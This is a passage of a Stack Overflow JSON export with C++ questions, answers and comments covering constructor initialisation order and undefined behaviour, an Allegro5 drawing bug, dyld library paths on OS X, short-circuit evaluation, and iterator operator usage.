"comment_id": 47748177, "body": "@Claudiu Right, it&#39;s definitely UB."}, {"owner": {"reputation": 35670, "user_id": 420683, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/68b74cb21e360e5601ce6c812f59a136?s=128&d=identicon&r=PG", "display_name": "dyp", "link": "https://stackoverflow.com/users/420683/dyp"}, "edited": false, "score": 0, "creation_date": 1429743528, "post_id": 29809865, "comment_id": 47748831, "body": "Can you bind a <i>reference</i> to an object that has not yet been constructed? There are differences between the semantics of pointers and references. For example, <code>int* p = nullptr; int&amp; r = *p;</code> is considered UB, but <code>int* r = &amp;*p;</code> is arguably not UB (C explicitly allows it, for example)."}, {"owner": {"reputation": 38119, "user_id": 3959454, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4d3d3eb6143879550d0e5bd67a6bf647?s=128&d=identicon&r=PG&f=1", "display_name": "Anton Savin", "link": "https://stackoverflow.com/users/3959454/anton-savin"}, "reply_to_user": {"reputation": 35670, "user_id": 420683, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/68b74cb21e360e5601ce6c812f59a136?s=128&d=identicon&r=PG", "display_name": "dyp", "link": "https://stackoverflow.com/users/420683/dyp"}, "edited": false, "score": 0, "creation_date": 1429744932, "post_id": 29809865, "comment_id": 47749329, "body": "@dyp Unfortunately I couldn&#39;t find an explicit quote about references, only that [class.cdtor]/3 may imply that if we have something to convert from, it was obtained with well-defined means."}], "tags": [], "owner": {"reputation": 38119, "user_id": 3959454, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4d3d3eb6143879550d0e5bd67a6bf647?s=128&d=identicon&r=PG&f=1", "display_name": "Anton Savin", "link": "https://stackoverflow.com/users/3959454/anton-savin"}, "is_accepted": true, "score": 2, "last_activity_date": 1429740733, "creation_date": 1429740733, "answer_id": 29809865, "question_id": 29809241, "link": "https://stackoverflow.com/questions/29809241/circular-dependency-in-constructor-initialization-list/29809865#29809865", "title": "Circular dependency in constructor initialization list", "body": "<p>N4140 [class.cdtor]/1 reads:</p>\n\n<blockquote>\n  <p>For an object with a non-trivial constructor, referring to any non-static member or base class of the object\n  before the constructor begins execution results in undefined behavior. For an object with a non-trivial\n  destructor, referring to any non-static member or base class of the object after the destructor finishes\n  execution results in undefined behavior.</p>\n</blockquote>\n\n<p>While this passage itself doesn't imply that the behavior is otherwise well-defined, the following example shows that it is. Here is an excerpt:</p>\n\n<pre><code>struct B : public A { int j; Y y; }; // non-trivial\nextern B bobj;\nB* pb = &amp;bobj; // OK\n</code></pre>\n\n<p>So the answer is: yes, the behavior in your case is well defined if you aren't referring to members or base classes of <code>b</code> in the constructor of <code>A</code>.</p>\n"}], "owner": {"reputation": 205730, "user_id": 15055, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/7f71287b47b7189d11fe6d3fbc7ed2fe?s=128&d=identicon&r=PG", "display_name": "Claudiu", "link": "https://stackoverflow.com/users/15055/claudiu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 635, "favorite_count": 0, "accepted_answer_id": 29809865, "answer_count": 1, "score": 5, "last_activity_date": 1429740733, "creation_date": 1429738246, "last_edit_date": 1429738480, "question_id": 29809241, "link": "https://stackoverflow.com/questions/29809241/circular-dependency-in-constructor-initialization-list", "title": "Circular dependency in constructor initialization list", "body": "<p>Is the following well-defined?</p>\n\n<pre><code>class A;\nclass B;\n\n// define A, which takes B&amp; in constructor\n// define B, which takes A&amp; in constructor\n\nclass C\n{\n    A a;\n    B b;\npublic:\n    C() : a(b), b(a) { /* stuff with a and b */ }\n}\n</code></pre>\n\n<p>Full example at <a href=\"https://ideone.com/EuVNca\" rel=\"noreferrer\">ideone.com</a>.</p>\n\n<p>Is it safe/well-defined so long as the constructors for <code>A</code> and <code>B</code> don't do anything with the references they get? </p>\n"}, {"tags": ["c++", "graphics", "game-loop", "allegro5"], "comments": [{"owner": {"reputation": 826, "user_id": 1760583, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ceb7fbcd8fae120967309f671e34acd1?s=128&d=identicon&r=PG", "display_name": "Philipp Lenk", "link": "https://stackoverflow.com/users/1760583/philipp-lenk"}, "edited": false, "score": 0, "creation_date": 1429739204, "post_id": 29809209, "comment_id": 47747039, "body": "I cant really tell for sure without a <a href=\"http://stackoverflow.com/help/mcve\">mcve</a>, but from the code shown, and assuming renderable-&gt;getChildren() returns a std::vector&lt;IRenderable*&gt;, the problem is propably related to the fact that after rendering one of the elements you always recurse and call al_clear_to_color as a result."}, {"owner": {"reputation": 7070, "user_id": 1087848, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/7c09991a02e7ffa559c69d159231b07a?s=128&d=identicon&r=PG", "display_name": "11684", "link": "https://stackoverflow.com/users/1087848/11684"}, "reply_to_user": {"reputation": 826, "user_id": 1760583, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ceb7fbcd8fae120967309f671e34acd1?s=128&d=identicon&r=PG", "display_name": "Philipp Lenk", "link": "https://stackoverflow.com/users/1760583/philipp-lenk"}, "edited": false, "score": 0, "creation_date": 1429739704, "post_id": 29809209, "comment_id": 47747252, "body": "@PhilippLenk It may have been part of the cause, but it didn&#39;t solve the problem. After extracting the loop and the recursion into its own method I still can&#39;t see the square drawn at 120, 120. Will make an mcve."}, {"owner": {"reputation": 7070, "user_id": 1087848, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/7c09991a02e7ffa559c69d159231b07a?s=128&d=identicon&r=PG", "display_name": "11684", "link": "https://stackoverflow.com/users/1087848/11684"}, "reply_to_user": {"reputation": 826, "user_id": 1760583, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ceb7fbcd8fae120967309f671e34acd1?s=128&d=identicon&r=PG", "display_name": "Philipp Lenk", "link": "https://stackoverflow.com/users/1760583/philipp-lenk"}, "edited": false, "score": 0, "creation_date": 1429740055, "post_id": 29809209, "comment_id": 47747435, "body": "@PhilippLenk Sorry, I messed up the width of my test squares, you correctly diagnosed the problem. If you post an answer, I will accept it. Thank you very much!"}], "answers": [{"tags": [], "owner": {"reputation": 826, "user_id": 1760583, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ceb7fbcd8fae120967309f671e34acd1?s=128&d=identicon&r=PG", "display_name": "Philipp Lenk", "link": "https://stackoverflow.com/users/1760583/philipp-lenk"}, "is_accepted": true, "score": 0, "last_activity_date": 1429740796, "last_edit_date": 1495539816, "creation_date": 1429740796, "answer_id": 29809879, "question_id": 29809209, "link": "https://stackoverflow.com/questions/29809209/al-draw-filled-rectangle-seems-to-work-only-in-some-classes/29809879#29809879", "title": "al_draw_filled_rectangle() seems to work only in some classes", "body": "<p>It cant realiably be deduced without a <a href=\"https://stackoverflow.com/help/mcve\">mcve</a>, but from the code shown, and assuming renderable->getChildren() returns a std::vector, the problem is most propably related to the fact that after rendering one of the elements you always recurse and call al_clear_to_color as a result:</p>\n\n<pre><code>al_clear_to_color(al_map_rgb(0,0,90)); //1: clear screen\nIRenderable *renderable;\nfor (std::vector&lt;IRenderable*&gt;::iterator it = toRender.begin(); it != toRender.end(); ++it) {\n    renderable = *it;\n\n    //renders one element\n    renderable-&gt;render();\n\n    //recurses and therefore reaches 1(clear screen) again(even if there are no children)\n    render(renderable-&gt;getChildren());\n}\n</code></pre>\n"}], "owner": {"reputation": 7070, "user_id": 1087848, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/7c09991a02e7ffa559c69d159231b07a?s=128&d=identicon&r=PG", "display_name": "11684", "link": "https://stackoverflow.com/users/1087848/11684"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 160, "favorite_count": 0, "accepted_answer_id": 29809879, "answer_count": 1, "score": 0, "last_activity_date": 1429740796, "creation_date": 1429738162, "question_id": 29809209, "link": "https://stackoverflow.com/questions/29809209/al-draw-filled-rectangle-seems-to-work-only-in-some-classes", "title": "al_draw_filled_rectangle() seems to work only in some classes", "body": "<p>I am trying to write a basic program with a game loop (it can't be called a game any time soon). Almost everything I have (which isn't much, frankly) is fine, just the one object in my render tree doesn't render!</p>\n\n<p>The game loop:</p>\n\n<pre><code>void Game::enterMainLoop() {\n    running = true;\n    double lastTime = al_get_time();\n    std::cout &lt;&lt; \"Entering main loop!\" &lt;&lt; std::endl;\n    while (running) { // Never mind the infinite loop. This isn't the final version\n        double current = al_get_time();\n        double timePassed = current - lastTime;\n        processInput();\n        processUpdatables();\n        processPhysicalObjects();\n        processRenderables();\n\n        update(timePassed);\n        physics(timePassed);\n        render(renderTree);\n\n        lastTime = current;\n    }\n}\n</code></pre>\n\n<p>I have verified it loops correctly (and quickly - the called methods don't do much).</p>\n\n<p>The <code>Game::render()</code> method:</p>\n\n<pre><code>void Game::render(std::vector&lt;IRenderable*&gt; toRender) {\n    al_clear_to_color(al_map_rgb(0,0,90));\n    IRenderable *renderable;\n    for (std::vector&lt;IRenderable*&gt;::iterator it = toRender.begin(); it != toRender.end(); ++it) {\n        renderable = *it;\n        renderable-&gt;render();\n        render(renderable-&gt;getChildren());\n    }\n    al_draw_filled_rectangle(10, 10, 120, 120, al_map_rgb(255, 255, 255));\n    al_flip_display();\n}\n</code></pre>\n\n<p>I verified the one object in the render tree's <code>render</code> method is called (by putting a <code>cout</code> statement in its body, which prints every frame). The filled rectangle is visible on screen.</p>\n\n<p>The <code>Player::render</code> method at first drew a square at <code>(this.x, this.y)</code> with dimensions <code>this.width x this.height</code>, but I saw nothing on screen, so I simplified it to this:</p>\n\n<pre><code>void Player::render() {\n    std::cout &lt;&lt; \"Player::render called! x: \" &lt;&lt; x &lt;&lt; \", y: \" &lt;&lt; y &lt;&lt; std::endl;\n    al_draw_filled_rectangle(120, 120, 120, 120, al_map_rgb(255, 255, 255));\n}\n</code></pre>\n\n<p>Yes, the <code>cout</code> statement prints every frame, so the <code>render()</code> method is called correctly. Yet I don't see a second rectangle.</p>\n\n<p>Why can't I draw from the <code>Player</code> class?</p>\n\n<p>(Note: everything compiles without output with <code>-Wall</code> enabled. During runtime I also don't have any output besides what I generate with <code>cout</code> statements.)</p>\n"}, {"tags": ["c++", "macos"], "comments": [{"owner": {"reputation": 35069, "user_id": 1324, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/883238a436c061eaf848af87b8fda561?s=128&d=identicon&r=PG", "display_name": "Paul Roub", "link": "https://stackoverflow.com/users/1324/paul-roub"}, "edited": false, "score": 0, "creation_date": 1429737767, "post_id": 29809069, "comment_id": 47746308, "body": "See this question: <a href=\"http://stackoverflow.com/questions/10359063/dyld-library-not-loaded-opt-local-lib-libglib-2-0-0-dylib?rq=1\" title=\"dyld library not loaded opt local lib libglib 2 0 0 dylib\">stackoverflow.com/questions/10359063/&hellip;</a> and the Apple topic referenced in its answer: <a href=\"https://developer.apple.com/library/mac/#documentation/DeveloperTools/Conceptual/DynamicLibraries/000-Introduction/Introduction.html\" rel=\"nofollow noreferrer\">developer.apple.com/library/mac/#documentation/DeveloperTool&zwnj;&#8203;s/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 273, "user_id": 4256748, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ac027c2b12eb957c1eb0813bc6f4bd7d?s=128&d=identicon&r=PG&f=1", "display_name": "ZacSketches", "link": "https://stackoverflow.com/users/4256748/zacsketches"}, "edited": false, "score": 0, "creation_date": 1429753893, "post_id": 29809480, "comment_id": 47752223, "body": "I appreciate the link to the article on Dynamic Library Programming Topics.  What&#39;s the difference between <code>install_name_tool</code> and what I ended up doing which was to manually build a sym link to the library in the <code>&#47;usr&#47;local&#47;lib&#47;</code> folder?"}, {"owner": {"reputation": 7386, "user_id": 699854, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/2tCRG.jpg?s=128&g=1", "display_name": "Kirell", "link": "https://stackoverflow.com/users/699854/kirell"}, "reply_to_user": {"reputation": 273, "user_id": 4256748, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ac027c2b12eb957c1eb0813bc6f4bd7d?s=128&d=identicon&r=PG&f=1", "display_name": "ZacSketches", "link": "https://stackoverflow.com/users/4256748/zacsketches"}, "edited": false, "score": 0, "creation_date": 1429786436, "post_id": 29809480, "comment_id": 47768763, "body": "The path to the library is written in itself, that&#39;s why you should never move a dylib once it is installed. Doing a symlink is juste cheating the linker because your dylib has an path issue. It works but it is a hack. You could add your lib folder to the corresponding environnement variable though. Check this link <a href=\"http://superuser.com/questions/282450/where-do-i-set-dyld-library-path-on-mac-os-x-and-is-it-a-good-idea\" title=\"where do i set dyld library path on mac os x and is it a good idea\">superuser.com/questions/282450/&hellip;</a>"}], "tags": [], "owner": {"reputation": 7386, "user_id": 699854, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/2tCRG.jpg?s=128&g=1", "display_name": "Kirell", "link": "https://stackoverflow.com/users/699854/kirell"}, "is_accepted": true, "score": 5, "last_activity_date": 1429739210, "creation_date": 1429739210, "answer_id": 29809480, "question_id": 29809069, "link": "https://stackoverflow.com/questions/29809069/dyld-library-not-loaded-on-os-x/29809480#29809480", "title": "dyld: Library not loaded: on OS X", "body": "<p>A good place to start would be the Apple documentation on <a href=\"https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/OverviewOfDynamicLibraries.html#//apple_ref/doc/uid/TP40001873-SW1\" rel=\"noreferrer\">Dynamic Library Programming Topics</a>\nand especially <a href=\"https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/RunpathDependentLibraries.html#//apple_ref/doc/uid/TP40008306-SW1\" rel=\"noreferrer\">Run-Path Dependent Libraries</a>.</p>\n\n<p>\"When the dynamic loader (dyld) loads the executable, it looks for run-path dependent libraries in the run-path search paths in the order in which they were specified at link time.\"</p>\n\n<p>The first think is to check the libraries dependencies for you binary using otool:</p>\n\n<pre><code>otool -L /path/to/binary\n</code></pre>\n\n<p>Then, you have different solutions depending on how you want to distribute your library.</p>\n\n<p>You can specify the absolute path of the library in the binary. It should be done with a tool, CMake for instance. Otherwise, you can use</p>\n\n<pre><code>install_name_tool to change the path to a library by hand.\n</code></pre>\n\n<p>Most of the time, you want to deploy your binary and put the dylibs in a separated folder. Those libraries are loaded relatively to where the binary is.\nFor example:</p>\n\n<pre><code>    @loader_path/../Frameworks/Sparkle.framework/Versions/A/Sparkle\n</code></pre>\n\n<p>For more info about paths, I suggest you read <a href=\"https://wincent.com/wiki/@executable_path,_@load_path_and_@rpath\" rel=\"noreferrer\">this blog</a>.</p>\n"}], "owner": {"reputation": 273, "user_id": 4256748, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ac027c2b12eb957c1eb0813bc6f4bd7d?s=128&d=identicon&r=PG&f=1", "display_name": "ZacSketches", "link": "https://stackoverflow.com/users/4256748/zacsketches"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 13568, "favorite_count": 2, "accepted_answer_id": 29809480, "answer_count": 1, "score": 2, "last_activity_date": 1429739210, "creation_date": 1429737608, "question_id": 29809069, "link": "https://stackoverflow.com/questions/29809069/dyld-library-not-loaded-on-os-x", "title": "dyld: Library not loaded: on OS X", "body": "<p>I'm building with g++ from the command line in OS X, and not using XCode.  When I built my executable I had to include the linker flag to the library where the dynamic library was stored, but when I went to run the executable the dynamic library was not found, and I got the error <code>dyld: Library not loaded: (foo)</code>.  </p>\n\n<p>There were a few questions on here already about dynamic libraries related to specific software packages and how to get dynamic libraries built into XCode projects, but nothing generic explaining how Mac OS X looks for dynamic libraries in general and how to get a new .dylib into the search path for the executable.</p>\n\n<p>Could someone fill in that gap.  How does Mac OS X look for dynamic libraries when one is built with an executable and how would I put a link to my dynamic library in the right place so the executable will run?</p>\n\n<p>I'm on OSX 10.9 - Mavericks.</p>\n"}, {"tags": ["c++", "if-statement", "compiler-optimization", "boolean-logic"], "comments": [{"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 1, "creation_date": 1429737678, "post_id": 29809045, "comment_id": 47746261, "body": "<a href=\"http://en.wikipedia.org/wiki/Short-circuit_evaluation\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/Short-circuit_evaluation</a>"}, {"owner": {"reputation": 35069, "user_id": 1324, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/883238a436c061eaf848af87b8fda561?s=128&d=identicon&r=PG", "display_name": "Paul Roub", "link": "https://stackoverflow.com/users/1324/paul-roub"}, "edited": false, "score": 1, "creation_date": 1429737683, "post_id": 29809045, "comment_id": 47746264, "body": "The evaluation will stop -- or <a href=\"http://en.wikipedia.org/wiki/Short-circuit_evaluation\" rel=\"nofollow noreferrer\">short circuit</a> -- after the first true operand. And yes, like any expression, the compiler will interpret the whole thing before generating any code."}, {"owner": {"reputation": 48421, "user_id": 1196549, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/fa597bf0dc47449a25e1f7f5b57e3ef1?s=128&d=identicon&r=PG", "display_name": "Yves Daoust", "link": "https://stackoverflow.com/users/1196549/yves-daoust"}, "edited": false, "score": 3, "creation_date": 1429737803, "post_id": 29809045, "comment_id": 47746330, "body": "Short-circuit evaluation should not be seen as an &quot;optimization trick&quot;. On the opposite, it is an important language feature that allows you to write safe expressions like <code>i&lt;N &amp;&amp; A[i] != 0</code>, which could otherwise cause illegal memory accesses (or other circumstance in which the second operand cannot be evaluated)."}, {"owner": {"reputation": 10555, "user_id": 2812864, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/GVsZM.jpg?s=128&g=1", "display_name": "Mateusz Grzejek", "link": "https://stackoverflow.com/users/2812864/mateusz-grzejek"}, "reply_to_user": {"reputation": 48421, "user_id": 1196549, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/fa597bf0dc47449a25e1f7f5b57e3ef1?s=128&d=identicon&r=PG", "display_name": "Yves Daoust", "link": "https://stackoverflow.com/users/1196549/yves-daoust"}, "edited": false, "score": 0, "creation_date": 1429738097, "post_id": 29809045, "comment_id": 47746475, "body": "@YvesDaoust Good point, although relying too often on this feature can lead to a bit obfuscated code."}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "reply_to_user": {"reputation": 10555, "user_id": 2812864, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/GVsZM.jpg?s=128&g=1", "display_name": "Mateusz Grzejek", "link": "https://stackoverflow.com/users/2812864/mateusz-grzejek"}, "edited": false, "score": 0, "creation_date": 1429738216, "post_id": 29809045, "comment_id": 47746539, "body": "@MateuszGrzejek Practically any language feature can &#39;lead to a bit of obfuscated code&#39;. &#39;You can write Fortran in any language&#39; - D.M. Ritchie."}], "owner": {"reputation": 1915, "user_id": 4475902, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/8283da1024358bce8d1a286b923c360c?s=128&d=identicon&r=PG&f=1", "display_name": "Konrad", "link": "https://stackoverflow.com/users/4475902/konrad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 37, "favorite_count": 0, "closed_date": 1429737624, "answer_count": 0, "score": 0, "last_activity_date": 1429737677, "creation_date": 1429737485, "question_id": 29809045, "link": "https://stackoverflow.com/questions/29809045/c-if-operator-or-and-testing-methodology", "closed_reason": "Duplicate", "title": "C++ if operator - OR, AND: testing methodology", "body": "<p>I am pretty sure that this question has been asked before, but I really could not find it on stackoverflow. It seems relatively straightforward to me what the answer would be, but I need to be sure. I would be happy if you could redirect this question to any similar questions that you know of, that has already been answered (with good answers!). Here goes:</p>\n\n<p>In the piece of code below</p>\n\n<pre><code>if (first_boolean &amp;&amp; second_boolean &amp;&amp; ... &amp;&amp; last_boolean)\n{\n     //some code...\n}\n</code></pre>\n\n<p>If, say the first boolean is false, would the compiler check any of the other boolean values if all those operators in between are AND operators? (Since, as you know, if all of those in between are AND operators, the whole boolean in the if statement would be false then). I am assuming the compiler checks all the logical operators beforehand (without evaluating the boolean statements) to make sure that if, say the first or second boolean is false, the whole statement would be false?</p>\n\n<p>In addition, if the compiler does make such an optimization, does it check the whole boolean expression from left to right?</p>\n\n<p>Thank in advance.</p>\n"}, {"tags": ["c++", "listiterator"], "comments": [{"owner": {"reputation": 370, "user_id": 2460992, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/556d249147908ac03c34bd8a71ee2459?s=128&d=identicon&r=PG", "display_name": "DAhrens", "link": "https://stackoverflow.com/users/2460992/dahrens"}, "edited": false, "score": 1, "creation_date": 1429737508, "post_id": 29809019, "comment_id": 47746167, "body": "They may not have known about it? As you say they do the same thing."}, {"owner": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "edited": false, "score": 1, "creation_date": 1429737530, "post_id": 29809019, "comment_id": 47746182, "body": "Yes, it is fine. Ask your colleague."}], "answers": [{"tags": [], "owner": {"reputation": 590, "user_id": 3723381, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bce558a3d4cc7f0c30c8b40db7e4d8c0?s=128&d=identicon&r=PG", "display_name": "Austinh100", "link": "https://stackoverflow.com/users/3723381/austinh100"}, "is_accepted": false, "score": 2, "last_activity_date": 1429737617, "creation_date": 1429737617, "answer_id": 29809071, "question_id": 29809019, "link": "https://stackoverflow.com/questions/29809019/iterator-de-reference-then-operator-versus-operator/29809071#29809071", "title": "Iterator de-reference then &quot;.&quot; operator versus. &quot;-&gt;&quot; operator", "body": "<p>No, style preferences / knowledge of <code>-&gt;</code> would be the only reason they would use <code>(* a).</code> vs <code>-&gt;</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 13520, "user_id": 2315602, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/8rKPi.jpg?s=128&g=1", "display_name": "lisyarus", "link": "https://stackoverflow.com/users/2315602/lisyarus"}, "is_accepted": false, "score": 6, "last_activity_date": 1429737763, "creation_date": 1429737763, "answer_id": 29809113, "question_id": 29809019, "link": "https://stackoverflow.com/questions/29809019/iterator-de-reference-then-operator-versus-operator/29809113#29809113", "title": "Iterator de-reference then &quot;.&quot; operator versus. &quot;-&gt;&quot; operator", "body": "<p>Considering the general case, it could happen that some iterator class did not provide <code>operator -&gt;</code>, and doing <code>(*it).x</code> would be the only possible way. Another possibility is that <code>operator *</code> and <code>operator -&gt;</code> have some non-standard semantics and are not interchangeble. However, this class would fail to satisfy any iterator concept, and, technically, would not be an iterator.</p>\n\n<p>In your case it is <code>std::list&lt;T&gt;::iterator</code>, for which <code>it-&gt;x</code> and <code>(*it).x</code> are equivalent.</p>\n"}, {"comments": [{"owner": {"reputation": 1187, "user_id": 1110444, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/uWeLX.jpg?s=128&g=1", "display_name": "Hosack", "link": "https://stackoverflow.com/users/1110444/hosack"}, "edited": false, "score": 0, "creation_date": 1429738051, "post_id": 29809141, "comment_id": 47746446, "body": "Thanks!  I did not consider looking into operator overloading."}], "tags": [], "owner": {"reputation": 462, "user_id": 3113508, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b8950f1d046593f6cbd9bca76961583f?s=128&d=identicon&r=PG", "display_name": "Scott M", "link": "https://stackoverflow.com/users/3113508/scott-m"}, "is_accepted": false, "score": 5, "last_activity_date": 1429737845, "last_edit_date": 1495542719, "creation_date": 1429737845, "answer_id": 29809141, "question_id": 29809019, "link": "https://stackoverflow.com/questions/29809019/iterator-de-reference-then-operator-versus-operator/29809141#29809141", "title": "Iterator de-reference then &quot;.&quot; operator versus. &quot;-&gt;&quot; operator", "body": "<p>This answer has background on why the two methods both exist for pointers if they achieve the same thing: <a href=\"https://stackoverflow.com/a/6632474/3113508\">https://stackoverflow.com/a/6632474/3113508</a></p>\n\n<p>Your change would be perfectly fine (and probably preferred by most) for  STL iterators for the same reason the <code>-&gt;</code> operator is generally preferred for use with pointers.</p>\n\n<p>However, be aware that the unary <code>*</code> operator and the <code>-&gt;</code>operator can be overloaded to provide semantically different behavior in user-defined classes. So, potentially someone could choose to use <code>*</code> or <code>-&gt;</code> in a different way, such that <code>foo-&gt;bar</code> is no longer the same as <code>(*foo).bar</code>. Make sure you are familiar with the documentation for the classes that you are using.</p>\n"}, {"comments": [{"owner": {"reputation": 1190, "user_id": 3207828, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1EPkw.jpg?s=128&g=1", "display_name": "Dan Korn", "link": "https://stackoverflow.com/users/3207828/dan-korn"}, "edited": false, "score": 0, "creation_date": 1429738491, "post_id": 29809201, "comment_id": 47746674, "body": "True, but the * operator can be overloaded, and in the case of an STL iterator,  either way you dereference it uses an operator overload."}, {"owner": {"reputation": 119228, "user_id": 412080, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/239e18525e4c29872d85b2b553b2e4d2?s=128&d=identicon&r=PG", "display_name": "Maxim Egorushkin", "link": "https://stackoverflow.com/users/412080/maxim-egorushkin"}, "reply_to_user": {"reputation": 1190, "user_id": 3207828, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1EPkw.jpg?s=128&g=1", "display_name": "Dan Korn", "link": "https://stackoverflow.com/users/3207828/dan-korn"}, "edited": false, "score": 0, "creation_date": 1429738664, "post_id": 29809201, "comment_id": 47746774, "body": "@DanKorn <code>operator*</code> is not applied recursively to its return value, unlike <code>operator-&gt;</code>."}], "tags": [], "owner": {"reputation": 119228, "user_id": 412080, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/239e18525e4c29872d85b2b553b2e4d2?s=128&d=identicon&r=PG", "display_name": "Maxim Egorushkin", "link": "https://stackoverflow.com/users/412080/maxim-egorushkin"}, "is_accepted": false, "score": 1, "last_activity_date": 1429739046, "last_edit_date": 1429739046, "creation_date": 1429738128, "answer_id": 29809201, "question_id": 29809019, "link": "https://stackoverflow.com/questions/29809019/iterator-de-reference-then-operator-versus-operator/29809201#29809201", "title": "Iterator de-reference then &quot;.&quot; operator versus. &quot;-&gt;&quot; operator", "body": "<p>The difference is that <code>operator-&gt;</code> can be overloaded to return multiple levels of proxy objects with overloaded <code>operator-&gt;</code> to which it is then again applied recursively, until a plain pointer is returned, like in <a href=\"http://www.stroustrup.com/wrapper.pdf\" rel=\"nofollow\">Wrapping C++ Member Function Calls by Bjarne Stroustrup</a>.</p>\n\n<p>Whereas <code>operator.</code> cannot be overloaded in C++.</p>\n\n<p>The example from that paper is:</p>\n\n<pre><code>#include&lt;iostream&gt;\n\nusing namespace std;\n\nvoid prefix() { cout&lt;&lt; \"prefix\"; }\nvoid suffix() { cout&lt;&lt; \" suffix\\n\"; }\n\ntemplate&lt;class T&gt;\nclass Call_proxy{\n  T* p;\npublic:\n  Call_proxy(T* pp) :p(pp){ }\n  \u02dcCall_proxy() { suffix() ; }\n  T* operator-&gt;() { return p; }\n};\n\ntemplate&lt;class T&gt;\nclass Wrap{\n  T* p;\npublic:\n  Wrap(T* pp) :p(pp) { }\n  Call_proxy&lt;T&gt; operator-&gt;() { prefix() ; return Call_proxy&lt;T&gt;(p) ; }\n};\n\nclass X{ // one user class\npublic:\nX() { cout&lt;&lt; \"make an X\\n\"; }\n  int f() const{ cout&lt;&lt; \"f()\"; return 1; }\n  void g() const{ cout&lt;&lt; \"g()\"; }\n};\n\nclass Y{ // another user class\npublic:\n  Y() { cout&lt;&lt; \"make a Y\\n\"; }\n  void h() const{ cout&lt;&lt; \"h()\"; }\n};\n\nint main() // simple test code\n{\n  Wrap&lt;X&gt; xx(new X) ;\n  Wrap&lt;Y&gt; yy(new Y) ;\n  if(xx-&gt;f()) cout&lt;&lt; \"done\\n\";\n  xx-&gt;g() ;\n  yy-&gt;h() ;\n  return 0;\n}\n</code></pre>\n\n<p>Each call of <code>xx</code> and <code>yy</code> is bracketed by a pair of prefix()/suffix() calls, so the program produced:</p>\n\n<pre><code>make an X\nmake a Y\nprefix f() suffix\ndone\nprefix g() suffix\nprefix h() suffix\n</code></pre>\n"}], "owner": {"reputation": 1187, "user_id": 1110444, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/uWeLX.jpg?s=128&g=1", "display_name": "Hosack", "link": "https://stackoverflow.com/users/1110444/hosack"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 929, "favorite_count": 0, "answer_count": 4, "score": 2, "last_activity_date": 1511061261, "creation_date": 1429737386, "last_edit_date": 1511061261, "question_id": 29809019, "link": "https://stackoverflow.com/questions/29809019/iterator-de-reference-then-operator-versus-operator", "title": "Iterator de-reference then &quot;.&quot; operator versus. &quot;-&gt;&quot; operator", "body": "<p>I've been given some C++ code that has a list/iterator of the following struct.</p>\n\n<pre><code>typedef struct{\n  int x;\n  int y;\n}my_struct;\n\nstd::list&lt;my_struct&gt; 